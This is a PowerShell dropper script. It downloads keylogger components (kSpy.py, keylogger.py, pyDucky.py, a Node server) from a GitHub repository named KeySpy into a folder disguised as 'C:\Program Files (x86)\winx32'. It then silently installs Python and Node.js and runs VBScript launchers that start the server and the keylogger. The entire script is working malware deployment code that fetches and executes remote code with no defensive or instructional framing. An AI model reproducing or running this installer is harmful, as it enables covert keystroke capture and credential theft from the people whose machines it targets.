# Define file URLs and folder path
$winx32Folder = "C:\Program Files (x86)\winx32"
$kSpyUrl = "https://raw.githubusercontent.com/3rr0r-505/KeySpy/main/src/gl0bal/kSpy.py"
$keyloggerUrl = "https://raw.githubusercontent.com/3rr0r-505/KeySpy/main/src/gl0bal/keylogger.py"
$pyDuckyUrl = "https://raw.githubusercontent.com/3rr0r-505/KeySpy/main/src/gl0bal/pyDucky.py"
$serverJsUrl = "https://raw.githubusercontent.com/3rr0r-505/KeySpy/main/src/gl0bal/server.js"
$runServerJSVbsUrl = "https://raw.githubusercontent.com/3rr0r-505/KeySpy/main/src/gl0bal/run-serverJS.vbs"
$runKspyVbsUrl = "https://raw.githubusercontent.com/3rr0r-505/KeySpy/main/src/gl0bal/run-kSpy.vbs"

# Download the Python files
Write-Host "Downloading Python files..."
Invoke-WebRequest -Uri $kSpyUrl -OutFile (Join-Path -Path $winx32Folder -ChildPath "kSpy.py")
Invoke-WebRequest -Uri $keyloggerUrl -OutFile (Join-Path -Path $winx32Folder -ChildPath "keylogger.py")
Invoke-WebRequest -Uri $pyDuckyUrl -OutFile (Join-Path -Path $winx32Folder -ChildPath "pyDucky.py")

# Download server.js
Write-Host "Downloading server.js..."
Invoke-WebRequest -Uri $serverJsUrl -OutFile (Join-Path -Path $winx32Folder -ChildPath "server.js")

# Check if Python is installed
$pythonPath = Get-Command python -ErrorAction SilentlyContinue
if (-not $pythonPath) {
    Write-Host "Python is not installed. Installing..."
    # Download and install Python
    $pythonInstallerUrl = "https://www.python.org/ftp/python/3.10.4/python-3.10.4-amd64.exe"
    $pythonInstallerPath = Join-Path -Path $winx32Folder -ChildPath "python-installer.exe"
    Invoke-WebRequest -Uri $pythonInstallerUrl -OutFile $pythonInstallerPath

    # Install Python silently
    Start-Process -FilePath $pythonInstallerPath -ArgumentList "/quiet InstallAllUsers=1 PrependPath=1" -Wait
}

# Check if Node.js is installed
$nodePath = Get-Command node -ErrorAction SilentlyContinue
if (-not $nodePath) {
    Write-Host "Node.js is not installed. Installing..."
    # Download and install Node.js
    $nodeInstallerUrl = "https://nodejs.org/dist/v16.14.0/node-v16.14.0-x64.msi"
    $nodeInstallerPath = Join-Path -Path $winx32Folder -ChildPath "node-installer.msi"
    Invoke-WebRequest -Uri $nodeInstallerUrl -OutFile $nodeInstallerPath

    # Install Node.js silently
    Start-Process -FilePath msiexec.exe -ArgumentList "/i $nodeInstallerPath /quiet" -Wait
}

# Install Express and Mongoose locally
Write-Host "Installing Express and Mongoose..."
Set-Location $winx32Folder
npm install express mongoose --save

# Download VBScript files
Write-Host "Downloading VBScript files..."
Invoke-WebRequest -Uri $runServerJSVbsUrl -OutFile (Join-Path -Path $winx32Folder -ChildPath "run-serverJS.vbs")
Invoke-WebRequest -Uri $runKspyVbsUrl -OutFile (Join-Path -Path $winx32Folder -ChildPath "run-Kspy.vbs")

# Execute the VBScript files using cscript.exe
Write-Host "Executing VBScript files..."
$runServerJSPath = Join-Path -Path $winx32Folder -ChildPath "run-serverJS.vbs"
$runKspyVbsPath = Join-Path -Path $winx32Folder -ChildPath "run-Kspy.vbs"

# Execute the run-serverJS.vbs file
Write-Host "Executing run-serverJS.vbs file..."
& $runServerJSPath

# Execute the run-Kspy.vbs file
Write-Host "Executing run-Kspy.vbs file..."
& $runKspyVbsPath

